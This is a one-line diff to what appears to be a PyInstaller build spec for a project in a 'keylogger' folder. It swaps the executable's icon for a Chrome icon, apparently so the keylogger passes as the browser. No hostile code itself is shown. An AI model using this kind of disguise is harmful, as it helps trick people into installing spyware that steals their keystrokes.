@@ -37,4 +37,4 @@ exe = EXE(pyz,
           disable_windowed_traceback=False,
           target_arch=None,
           codesign_identity=None,
-          entitlements_file=None , icon='C:\\Users\\Administrator\\Desktop\\VSC\\keylogger\\putin_icon.ico')
+          entitlements_file=None , icon='icons8-chrome-48.ico')
